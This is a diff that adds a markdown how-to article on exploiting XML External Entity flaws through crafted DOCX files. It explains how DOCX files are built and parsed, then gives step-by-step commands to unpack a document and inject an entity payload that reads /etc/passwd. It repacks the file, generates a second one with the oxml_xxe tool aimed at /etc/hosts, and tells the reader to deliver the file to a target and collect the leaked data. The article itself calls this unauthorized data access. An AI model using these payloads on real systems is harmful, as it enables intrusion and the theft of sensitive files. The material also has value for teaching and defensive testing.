@@ -1,0 +1,102 @@
+---
+title: 'Exploiting XXE in DOCX Files: A How-To Guide'
+description: Explore methods to exploit XML External Entities in DOCX for data exfiltration.
+keywords:
+- XXE
+- DOCX
+- OpenXML
+- XML External Entity
+- file exfiltration
+- cybersecurity
+- OpenXML injection
+---
+
+# XXE Inside DOCX File
+
+## Context
+
+The purpose of this article is to demonstrate how to exploit XML External Entity (XXE) vulnerabilities by embedding malicious payloads inside DOCX (OpenXML) files. This technique can be used for information disclosure or remote file retrieval. The reader is assumed to be familiar with XML structure, OpenXML format, and the structure of DOCX files, as well as the concept of XML External Entity (XXE) attacks.
+
+## Theory
+
+### OpenXML and DOCX Internal Structure
+
+DOCX files are essentially ZIP archives that contain multiple XML files following the OpenXML standard. Among these XML files, `[Content_Types].xml` and `word/document.xml` are particularly significant as they are parsed by document processors when the document is opened. This parsing process creates an opportunity for XML payloads to be executed.
+
+When a DOCX file is opened in a document processor, the application sequentially parses its internal XML files. This parsing can potentially trigger XXE payloads if the application does not securely handle these files.
+
+### XXE Attack Surface in DOCX Files
+
+The vulnerability model for XXE within DOCX files relies on the XML parser of the application being vulnerable with external entity resolution enabled. An attacker can craft a DOCX that carries a malicious XML file referencing external entities. When the target opens this DOCX file, the embedded payloads are triggered.
+
+One risk factor is the trust that applications inherently place in DOCX files. They are often considered benign, which poses a risk if the underlying XML parsing is insecure.
+
+### Embedding XXE Payloads in DOCX
+
+To exploit this vulnerability, attackers can inject malicious external entity definitions into XML files like `word/document.xml` or `[Content_Types].xml`. A common flaw in document processing libraries is not disabling external entity resolution by default, making such attacks feasible.
+
+## Practice
+
+### Manual XXE Payload Injection into DOCX
+
+To manually inject an XXE payload into a DOCX file, follow these steps:
+
+- **Extract the DOCX contents:**
+
+  ```bash
+  unzip target.docx -d docx_unpacked/
+  ```
+
+  Use the `unzip` command to extract the contents of the target DOCX file into a directory for modifications.
+
+- **Inject the XXE payload:**
+
+  Open the file `word/document.xml` in a text editor and inject the following XXE payload into a suitable location such as a text node or attribute:
+
+  ```xml
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+  <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+      <w:body>
+          <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
+      </w:body>
+  </w:document>
+  ```
+
+  This classic XXE payload references a local file, `/etc/passwd` in this instance.
+
+- **Repack the modified files:**
+
+  ```bash
+  zip -r malicious.docx *
+  ```
+
+  Repackage the modified XML files back into a new DOCX file using `zip`.
+
+- **Deploy and trigger the payload:**
+
+  Deliver the newly created `malicious.docx` file to the target. When the document is opened, the application parses the modified XML file, triggering the XXE payload and potentially leaking the contents of the referenced file.
+
+### Automated DOCX XXE Generation with oxml_xxe
+
+For an automated approach, you can use the `oxml_xxe` tool to generate a DOCX file with an embedded XXE payload:
+
+- **Generate an exploited DOCX:**
+
+  ```bash
+  oxml_xxe --input template.docx --payload 'file:///etc/hosts' --output evil.docx
+  ```
+
+  The `oxml_xxe` tool automates the process of injecting a payload into a DOCX file. The above command uses `template.docx` as a base, embeds a payload targeting `/etc/hosts`, and outputs it as `evil.docx`.
+
+- **Deploy and exploit:**
+
+  Deliver the `evil.docx` file to the intended target. Monitor for exfiltrated data either directly or through out-of-band channels, observing any leaks of sensitive data facilitated by the XXE injection.
+
+## Tools
+
+- **oxml_xxe**
+- **zip**
+- **unzip** 
+
+By following this guide, you can exploit XML External Entity vulnerabilities within DOCX files, leveraging them for unauthorized data access or exfiltration.
